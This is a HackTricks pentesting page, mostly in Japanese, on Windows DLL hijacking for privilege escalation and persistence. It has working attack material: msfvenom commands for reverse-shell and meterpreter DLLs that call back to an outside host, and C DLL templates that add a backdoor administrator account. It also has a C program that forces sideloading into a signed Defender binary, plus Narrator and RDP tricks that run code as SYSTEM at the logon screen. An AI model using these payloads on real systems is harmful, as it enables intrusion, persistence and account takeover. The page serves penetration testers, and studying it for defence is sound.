# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本情報

DLL Hijacking は、信頼されたアプリケーションに悪意ある DLL を読み込ませるよう操作する手法です。この用語は **DLL Spoofing, Injection, and Side-Loading** のようないくつかの戦術を包含します。主にコード実行や永続化に利用され、特権昇格に使われることは比較的まれです。ここでは昇格に焦点を当てますが、ハイジャックの方法自体は目的にかかわらず一貫しています。

### 一般的な手法

いくつかの方法が DLL hijacking に用いられ、アプリケーションの DLL 読み込み戦略によって有効性が変わります:

1. **DLL Replacement**: 本物の DLL を悪意あるものと置き換える。必要に応じて DLL Proxying を使って元の DLL の機能を保つ。
2. **DLL Search Order Hijacking**: 正当な DLL より先に検索されるパスに悪意ある DLL を配置し、アプリケーションの検索パターンを悪用する。
3. **Phantom DLL Hijacking**: アプリケーションが存在しないはずの必須 DLL をロードしようとする際に悪意ある DLL を作成して配置する。
4. **DLL Redirection**: %PATH% や .exe.manifest / .exe.local ファイルなどの検索パラメータを変更してアプリケーションを悪意ある DLL に向ける。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリで正当な DLL を悪意ある DLL と置き換える。DLL side-loading に関連することが多い。
6. **Relative Path DLL Hijacking**: アプリケーションをコピーしたユーザー制御のディレクトリに悪意ある DLL を置く。Binary Proxy Execution 技術に似る。

## 欠落している Dlls の検索

システム内で欠落している Dlls を見つける最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、**次の 2 つのフィルタ**を設定することです:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

そして **File System Activity** のみを表示します:

![](<../../../images/image (153).png>)

一般的な **missing dlls** を探している場合は、これを数秒間実行したままにします。\
特定の実行ファイル内の **missing dll** を探している場合は、**"Process Name" "contains" `<exec name>` のような別のフィルタを設定し、実行してイベントのキャプチャを停止してください。**

## 欠落している Dlls の悪用

権限昇格を行うための最良のチャンスは、特権プロセスが読み込もうとする DLL を、そのプロセスが検索する場所のいずれかに **書き込める**ことです。したがって、正規の DLL があるフォルダより先に検索されるフォルダに **dll を書き込む**（奇妙なケース）、あるいはアプリケーションが検索するフォルダへ **書き込みが可能で元の dll がどのフォルダにも存在しない**場合などが狙い目です。

### Dll 検索順序

**[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)** に、Dll がどのようにロードされるかが詳細に記載されています。

Windows アプリケーションは、あらかじめ定義された検索パスのセットに従って特定の順序で DLL を検索します。悪意ある DLL がこれらのディレクトリのいずれかに戦略的に配置され、正規の DLL より先に読み込まれると DLL hijacking の問題が発生します。これを防ぐ方法の一つは、アプリケーションが必要とする DLL を参照する際に絶対パスを使用することです。

32-bit システムでの DLL 検索順序は以下のとおりです:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

これは **SafeDllSearchMode** が有効な場合のデフォルト検索順序です。無効にすると現在のディレクトリが 2 番目の位置に上昇します。この機能を無効にするには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** レジストリ値を作成し、0 に設定します（デフォルトは有効）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数が **LOAD_WITH_ALTERED_SEARCH_PATH** を指定して呼ばれた場合、検索は LoadLibraryEx がロードしている実行可能モジュールのディレクトリで開始されます。

最後に、DLL は単に名前ではなく絶対パスを指定してロードされることがある点に注意してください。その場合、その DLL はそのパスでのみ検索されます（DLL に依存関係がある場合、それらは名前のみでロードされたものとして検索されます）。

検索順序を変更する他の方法もありますが、ここでは説明しません。

### RTL_USER_PROCESS_PARAMETERS.DllPath を介した sideloading の強制

新しく作成されたプロセスの DLL 検索パスに確定的に影響を与える高度な方法として、ntdll のネイティブ API を使ってプロセスを生成する際に RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定する方法があります。ここに攻撃者が制御するディレクトリを指定すると、ターゲットプロセスがインポート DLL を名前で解決する（絶対パスでなく、安全なフラグを使用していない）場合に、そのディレクトリから悪意ある DLL をロードさせることが可能になります。

主な考え方
- RtlCreateProcessParametersEx でプロセスパラメータを作成し、カスタムの DllPath を指定して制御下のフォルダ（例: ドロッパ/アンパッカがあるディレクトリ）を指すようにする。
- RtlCreateUserProcess でプロセスを作成する。ターゲットバイナリが名前で DLL を解決するとき、ローダは提供された DllPath を参照し、悪意ある DLL を信頼性高く sideload できるようになる。

注意 / 制限事項
- これは生成される子プロセスに影響します。現在のプロセスにのみ影響する SetDllDirectory とは異なります。
- ターゲットは名前で DLL をインポートするか LoadLibrary する必要があります（絶対パスではなく、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories を使用していないこと）。
- KnownDLLs やハードコードされた絶対パスはハイジャックできません。転送エクスポートや SxS により優先順位が変わる可能性があります。

最小の C サンプル (ntdll, wide strings, エラー処理簡略化):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

運用上の使用例
- 悪意ある xmllite.dll（必要な関数をエクスポートするか、実物をプロキシする）を DllPath ディレクトリに置く。
- 上記の手法を使って xmllite.dll を名前で参照することが知られている署名済みバイナリを起動する。ローダーは提供された DllPath を介してインポートを解決し、攻撃者の DLL を sideload する。

この手法は実際の攻撃でマルチステージの sideloading チェーンを駆動するために観測されている：最初のランチャーがヘルパー DLL をドロップし、それがカスタム DllPath を持った Microsoft-signed の hijackable バイナリを生成して、ステージングディレクトリから攻撃者の DLL を強制的にロードさせる。

#### Windows ドキュメントに記載された DLL 検索順序の例外

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### 権限昇格

**要件**:

- **different privileges** (horizontal or lateral movement) 下で動作する、または動作する予定のプロセスで、**DLL が欠如している**ものを特定する。
- **DLL が検索される**任意の**ディレクトリ**に対して**書き込みアクセス**があることを確認する。ここは実行ファイルのディレクトリや system path 内のディレクトリである可能性がある。

ええ、要件は見つけるのが複雑です。なぜなら **デフォルトでは特権を持つ実行ファイルが DLL を欠いているケースを見つけるのはかなり稀** ですし、**system path フォルダに書き込み権限があるのはさらに稀**（通常はできません）。しかし、設定ミスのある環境ではこれは可能です。\
運良く要件を満たす状況に出会った場合は、[UACME](https://github.com/hfiref0x/UACME) プロジェクトを確認するとよいでしょう。プロジェクトの**主目的は UAC を bypass すること**ですが、使用できる Windows バージョン向けの Dll hijacking の **PoC** が見つかるかもしれません（おそらく書き込み権限のあるフォルダのパスを変更するだけで済むでしょう）。

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして **PATH内のすべてのフォルダの権限を確認する**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
また、executableのimportsおよびdllのexportsを次の方法で確認できます：
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自動ツール

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は system PATH 内の任意のフォルダに書き込み権限があるかをチェックします。\
この脆弱性を発見するためのその他の興味深い自動化ツールには **PowerSploit functions**:_Find-ProcessDLLHijack_, _Find-PathDLLHijack_ および _Write-HijackDll_ があります。

### 例

もし悪用可能なシナリオを見つけた場合、成功させるために最も重要な点の一つは、実行ファイルがそこからインポートするすべての関数を少なくともエクスポートする dll を作成することです。Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **次のセクショ**ン you can find some **基本的な dll コード** that might be useful as **テンプレート** or to create a **dll with non required functions exported**.

## **Dll の作成とコンパイル**

### **Dll Proxifying**

基本的に **Dll proxy** はロード時に悪意のあるコードを実行できる一方で、すべての呼び出しを実際のライブラリに中継することで期待どおりに機能を公開し動作する Dll です。

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) を取得する:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成する（x86、x64版は見当たりませんでした）:**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自分用

いくつかの場合、コンパイルするDllは対象プロセスによってロードされる**export several functions**をエクスポートしている必要があることに注意してください。これらの関数が存在しないと、**binary won't be able to load**ため、**exploit will fail**。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL の例（ユーザー作成を含む）</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>スレッドエントリ付きの代替 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## ケーススタディ: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe は起動時に予測可能な言語固有の localization DLL をプローブし、これを悪用すると arbitrary code execution and persistence が可能です。

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. 静かにするには、アタッチ時に Narrator のスレッドを列挙し、メインスレッドを開いて (`OpenThread(THREAD_SUSPEND_RESUME)`) `SuspendThread` で停止し、自分のスレッドで処理を続行します。詳細なコードは PoC を参照してください。

Trigger and persistence via Accessibility configuration
- ユーザー コンテキスト (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記により、Narrator を起動すると配置した DLL がロードされます。セキュアデスクトップ（ログオン画面）では CTRL+WIN+ENTER を押して Narrator を起動します。

RDP-triggered SYSTEM execution (lateral movement)
- クラシックな RDP セキュリティレイヤーを許可: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- ホストに RDP 接続し、ログオン画面で CTRL+WIN+ENTER を押して Narrator を起動すると、セキュアデスクトップ上であなたの DLL が SYSTEM として実行されます。
- RDP セッションが閉じられると実行は停止します — 迅速に inject/migrate してください。

Bring Your Own Accessibility (BYOA)
- 組み込みの Accessibility Tool (AT) のレジストリエントリ（例: CursorIndicator）を複製し、任意のバイナリ/DLL を指すように編集してインポートし、`configuration` をその AT 名に設定できます。これにより Accessibility フレームワーク下で任意の実行がプロキシされます。

Notes
- `%windir%\System32` 以下への書き込みや HKLM の値変更には管理者権限が必要です。
- 全てのペイロードロジックは `DLL_PROCESS_ATTACH` 内に置けます。エクスポートは不要です。

## ケーススタディ: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

この事例は Lenovo の TrackPoint Quick Menu (`TPQMAssistant.exe`) における **Phantom DLL Hijacking** を示しており、追跡番号は **CVE-2025-1729** です。

### 脆弱性の詳細

- **Component**: `TPQMAssistant.exe` は `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置されています。
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` はログオンしているユーザーのコンテキストで毎日 9:30 AM に実行されます。
- **Directory Permissions**: `CREATOR OWNER` によって書き込み可能であり、ローカルユーザーが任意のファイルを置ける状態です。
- **DLL Search Behavior**: まず作業ディレクトリから `hostfxr.dll` をロードしようとし、見つからない場合は "NAME NOT FOUND" をログに出力します。これはローカルディレクトリの検索が優先されていることを示します。

### エクスプロイトの実装

攻撃者は同じディレクトリに悪意ある `hostfxr.dll` スタブを配置することで、欠損している DLL を悪用してユーザーコンテキストでのコード実行を達成できます:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻撃フロー

1. 標準ユーザーとして、`hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置する。
2. 現在のユーザーのコンテキストで、スケジュールされたタスクが午前9:30に実行されるのを待つ。
3. タスク実行時に管理者がログインしていれば、悪意のある DLL は管理者のセッションで中程度の整合性 (medium integrity) で実行される。
4. 標準的な UAC bypass 技術を連結して、medium integrity から SYSTEM 特権へ昇格させる。

## ケーススタディ: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

脅威アクターはしばしば MSI ベースの droppers を DLL side-loading と組み合わせて、信頼された署名済みプロセスの下でペイロードを実行する。

Chain overview
- ユーザーが MSI をダウンロード。GUI インストール中に CustomAction がサイレントで実行され（例: LaunchApplication や VBScript アクション）、埋め込まれたリソースから次段を再構築する。
- dropper は正当な署名済み EXE と悪意ある DLL を同一ディレクトリに書き込む（例: Avast-署名の wsc_proxy.exe + 攻撃者制御の wsc.dll）。
- 署名された EXE が起動されると、Windows の DLL 検索順により作業ディレクトリの wsc.dll が最初にロードされ、署名済み親プロセスの下で攻撃者のコードが実行される (ATT&CK T1574.001)。

MSI analysis (what to look for)
- CustomAction テーブル:
- 実行可能ファイルや VBScript を実行するエントリを探す。疑わしいパターン例: LaunchApplication が埋め込みファイルをバックグラウンドで実行する。
- Orca (Microsoft Orca.exe) で、CustomAction、InstallExecuteSequence、Binary テーブルを調査する。
- MSI の CAB 内の埋め込み／分割ペイロード:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- 複数の小さな断片があり、VBScript の CustomAction によって連結・復号されるものを探す。一般的なフロー：
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe を使った実践的な sideloading
- これら2つのファイルを同じフォルダに配置する:
- wsc_proxy.exe: 正規に署名されたホスト（Avast）。このプロセスはディレクトリから名前で wsc.dll をロードしようとします。
- wsc.dll: 攻撃者用 DLL。特定の exports が必要ない場合は DllMain だけで足ります；そうでない場合は proxy DLL を構築し、必要な exports を正規ライブラリにフォワードしつつ DllMain でペイロードを実行します。
- 最小限の DLL ペイロードをビルドする:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- エクスポート要件については、プロキシフレームワーク（例: DLLirant/Spartacus）を使用して、ペイロードも実行するフォワーディングDLLを生成してください。

- この手法はホストバイナリによるDLL名解決に依存します。ホストが絶対パスや安全なロードフラグ（例: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使用している場合、hijackは失敗する可能性があります。
- KnownDLLs、SxS、および forwarded exports は優先順位に影響を与える可能性があるため、ホストバイナリとエクスポートセットの選定時に考慮する必要があります。

## 参考文献

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
